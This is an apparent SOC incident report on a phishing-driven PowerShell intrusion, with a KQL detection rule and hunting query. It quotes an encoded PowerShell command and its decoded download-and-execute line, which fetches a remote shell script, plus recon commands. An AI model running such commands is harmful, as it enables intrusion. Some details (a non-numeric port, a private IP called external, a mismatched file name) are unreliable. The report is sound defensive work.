# SOC Incident Investigation: Suspicious Encoded PowerShell Execution

## 1. Incident Overview
* **Incident ID:** INC-2026-0813A
* **Severity:** 🔴 High
* **Status:** Closed (Contained & Eradicated)
* **Target Host:** `WKSTN-042.local`
* **Impacted User:** `Thabo.Admin`
* **Assigned Analyst:** Thabo
* **MITRE ATT&CK Tactic:** Execution ([TA0002](https://mitre.org)), Command and Control ([TA0011](https://mitre.org))
* **MITRE ATT&CK Technique:** Command and Scripting Interpreter: PowerShell ([T1059.001](https://mitre.org)), Obfuscated Files or Information ([T1027](https://mitre.org))

---

## 2. Detection Trigger & Alert Context
The incident was triggered by a custom Microsoft Sentinel Analytics Rule designed to flag heavily obfuscated or encoded PowerShell command lines executed within the environment.

### Triggered KQL Detection Rule
```kusto
// References: Detection-Rules/Suspicious-PowerShell.md
DeviceProcessEvents
| where ProcessCommandLine has_any ("-encodedcommand", "-enc", "-e ")
| where ProcessCommandLine matches regex @"(?i)-e(nc(odedcommand)?)?\s+[A-Za-z0-9+/={}]"
| project TimeGenerated, DeviceName, AccountName, ActingProcessName, ProcessCommandLine, InitiatingProcessCommandLine
```

---

## 3. Timeline of Events

| Timestamp (UTC) | Source Component | Event / Action Description |
| :--- | :--- | :--- |
| `2026-08-13 19:45:12` | Microsoft Sentinel | Alert Triggered: `Suspicious Encoded PowerShell Process Detected` on host `WKSTN-042`. |
| `2026-08-13 19:48:00` | SOC Analyst | Analyst acknowledged incident, initiated triage, and pulled host process logs. |
| `2026-08-13 19:54:30` | Cyber Security | Decoded malicious Base64 payload, revealing an active network callback. |
| `2026-08-13 20:02:15` | Defender for Endpoint | Host isolated from the corporate network to prevent lateral movement. |
| `2026-08-13 20:15:00` | Active Directory | Suspended user account `Thabo.Admin` and revoked all active authentication tokens. |

---

## 4. Deep-Dive Analyst Investigation

### Step 1: Payload Obfuscation Triage
The analytics rule captured the following raw process creation event originating from user `Thabo.Admin`:

```powershell
powershell.exe -NoP -NonI -W Hidden -Enc aWVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC4xLjEwMDpjMmMvc2hlbGwucHMnKQ==
```

### Step 2: Decoding the Malicious String
Cyber Security decoded the Base64 block using CyberChef. The plain text string exposed an explicit attempt to download and run a live reverse shell payload from a hostile external infrastructure:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:c2c/shell.ps1')
```

### Step 3: Scope and Correlation (Hunting)
Using the correlated hunting query (`Hunting-Queries/Suspicious-PowerShell-Hunting.md`), the analyst tracked downstream child processes spawned right after execution. The threat actor ran discovery tools to gather local network context:

```kusto
DeviceProcessEvents
| where DeviceName == "WKSTN-042.local"
| where TimeGenerated >= datetime(2026-08-13 19:45:00)
| project TimeGenerated, AccountName, ProcessName, ProcessCommandLine
```

**Discovered Attacker Reconnaissance Footprint:**
* `whoami` (Context validation)
* `net user /domain` (Domain user listing)
* `ipconfig /all` (Internal network configuration layout identification)

---

## 5. Verdict & Root Cause Analysis
* **Verdict:** True Positive (TP)
* **Root Cause:** A spear-phishing email delivered a macro-enabled document. The macro spawned an administrative PowerShell session using hijacked credentials (`Thabo.Admin`). This session initiated an outbound Command and Control (C2) callback to a known hostile infrastructure IP (`192.168.1.100`).

---

## 6. Containment, Eradication & Response Actions
1. **Network Isolation**: Automated isolation commands sent via Microsoft Defender for Endpoint quarantined host `WKSTN-042.local` within minutes.
2. **Credential Revocation**: Active Directory administrator suspended `Thabo.Admin` credentials. All active sessions were forced closed to nullify stolen access tokens.
3. **C2 Blocking**: Network security engineers blacklisted remote C2 indicator `192.168.1.100` on corporate perimeter firewalls.
4. **Remediation**: The host was thoroughly wiped, re-imaged, and cleared by the endpoint health check team before reintegration.
